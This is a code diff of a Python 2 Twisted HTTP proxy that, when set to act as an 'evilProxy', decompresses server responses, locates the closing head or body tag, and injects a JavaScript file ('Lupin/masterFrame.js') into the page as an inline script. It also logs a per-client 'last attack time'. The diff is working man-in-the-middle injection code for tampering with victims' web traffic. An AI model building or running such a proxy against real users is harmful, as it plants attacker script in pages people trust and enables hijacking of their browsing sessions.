@@ -44,14 +44,17 @@ class ServerConnection(HTTPClient):
     def handleHeader(self, key, value):     
         if (key.lower() == 'content-type'):
             if "text/html" not in value:
-                self.actAs = "goodProxy"
-        elif (key.lower() == 'content-encoding'):
-            if "gzip" in value:
-                self.isCompressed = True                
+                self.actAs = "goodProxy"              
         elif (key.lower() == 'content-length'):
             self.contentLength = value
-    
-        self.client.setHeader(key, value)
+
+	if (key.lower() == 'content-encoding') and ("gzip" not in value):
+		print "encoding: "+value
+	
+	if (key.lower() == 'content-encoding') and ("gzip" in value) and (self.actAs == "evilProxy"):
+                self.isCompressed = True  
+        else:
+            self.client.setHeader(key, value)
 
 
 
@@ -76,19 +79,19 @@ class ServerConnection(HTTPClient):
             HTTPClient.handleResponseEnd(self)
                       
 
+
     def handleResponse(self, data):
-        if (self.isCompressed):
-            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
-              
-        if self.actAs =="evilProxy":
-            print "FRAMING: "+self.client.getHeader("host")
-            data = self.injectMasterFrame(data)
-	    '''
-            lastAttack = open("lastAttack",'w')
-	    currTime = str(time.time())
-	    lastAttack.write(currTime)
-	    lastAttack.close()
-            '''
+
+	if self.actAs == "evilProxy":
+	    if (self.isCompressed):
+                data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
+
+            injectIndex = self.findEntryPoint(data);
+	    if injectIndex != -1:    
+            	print "FRAMING: "+self.client.getHeader("host")
+            	data = self.injectMasterFrame(data,injectIndex)
+	 
+
         if (self.contentLength != None):
             self.client.setHeader('Content-Length', len(data))     
 
@@ -96,34 +99,42 @@ class ServerConnection(HTTPClient):
         self.shutdown()
    
 
-    def injectMasterFrame(self,data):      
+
+ 
+    def findEntryPoint(self,data):
 	headEnd = data.find("</head>")
         if headEnd == -1:
              bodyEnd = data.find("</body>")
              if bodyEnd == -1:
-                return data
+                return -1
              else:       
-                newData = data[:bodyEnd]
-                rest = data[bodyEnd:] 
+                return bodyEnd
         else: 
-             newData = data[:headEnd]
-             rest = data[headEnd:] 
-                                                                                                                                                        
-        masterFrame = open("Lupin/masterFrame.js")
+             return headEnd    
+
+    def injectMasterFrame(self,data, injectIndex):            
+        newData = data[:injectIndex]
+        rest = data[injectIndex:]
+	masterFrame = open("Lupin/masterFrame.js")
 	master = masterFrame.read()
         newData += "<script type=\"text/javascript\">"+ master +"</script>" + rest
         masterFrame.close()
 
-	self.client.persistentData.setLastAttackTime(self.client.getClientIP())	
+	self.client.PersistentData.setLastAttackTime(self.client.getClientIP())	
         return newData
          
 
+
     def shutdown(self):
         if not self.shutdownComplete:
+	    #print "shutting down "+self.client.getHeader('host')+self.client.getPathFromUri()
             self.shutdownComplete = True
             try:  
                self.client.finish()        
             except:
                print "connection dead"
             self.transport.loseConnection() 
+
+
+
 
